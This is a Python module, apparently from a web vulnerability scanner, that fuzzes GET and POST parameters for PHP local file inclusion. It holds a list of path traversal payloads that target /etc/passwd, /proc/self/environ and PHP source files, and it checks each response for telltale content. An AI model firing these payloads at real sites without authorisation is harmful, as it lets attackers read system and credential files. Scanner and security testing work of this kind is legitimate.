import asyncio
from typing import List

from .mod import Mod, Page, Report, VulunableParam, ModTarget, ModCrackResult
from .requester import Requester

payloads = [
    (pattern.format(filepath), resp)
    for pattern in ["{}", "../../../../../../..{}", "/proc/self/root" * 22 + "{}"]
    for filepath, resp in [
        ("/proc/self/environ", "/usr/local/bin"),
        ("/etc/passwd", "root:x:0:0:Super User:"),
        ("/etc/group", "root:x:0:"),
        ("/proc/net/arp", "IP address"),
    ]
] + [
    (pattern.format(filepath), resp)
    for pattern in [
        # "{}",
        "./{}",
        "././././{}",
        "aaaadoneexist/../{}",
        "/var/www/html/{}",
        "/proc/self/root" * 22 + "/var/www/html/{}",
        "/proc/self/root" * 22 + "/proc/self/cwd/{}",
    ]
    for filepath, resp in [
        ("index.php", "<?php"),
        ("index", "<?php"),
    ]
]


class PHPIncludeFuzzMod(Mod):
    def __init__(self, requester: Requester):
        super().__init__()
        self.requeser = requester

    async def check(self, thing: ModTarget) -> float:
        if not isinstance(thing, Page) or not thing.params:
            return 0
        return 1

    async def crack_with_method(self, page, method):
        assert isinstance(page, Page) and page.params
        reports: List[Report] = []
        for param in page.params:
            result = await asyncio.gather(
                *[
                    self.requeser.submit_to(
                        page.url,
                        method,
                        params={
                            k: payload if k == param else "asdf" for k in page.params
                        },
                    )
                    for payload, _ in payloads
                ]
            )
            for (payload, payload_respond), resp in zip(payloads, result):
                if payload_respond not in resp.text:
                    continue
                reports += [
                    Report(
                        msg=f"在页面 {page.url} 找到一个会进行include的{method}参数{param}, payload为{payload}"
                    ),
                    VulunableParam(frompage=page, httpmethod=method, param=param),
                ]

                break

        return reports

    async def crack(self, thing: ModTarget) -> List[ModCrackResult]:
        if not isinstance(thing, Page) or not thing.params:
            return []
        page = thing
        assert page.params is not None
        results = await asyncio.gather(
            *[self.crack_with_method(page, method) for method in ["GET", "POST"]]
        )
        reports: List[ModCrackResult] = [
            report for report_list in results for report in report_list
        ]
        return reports
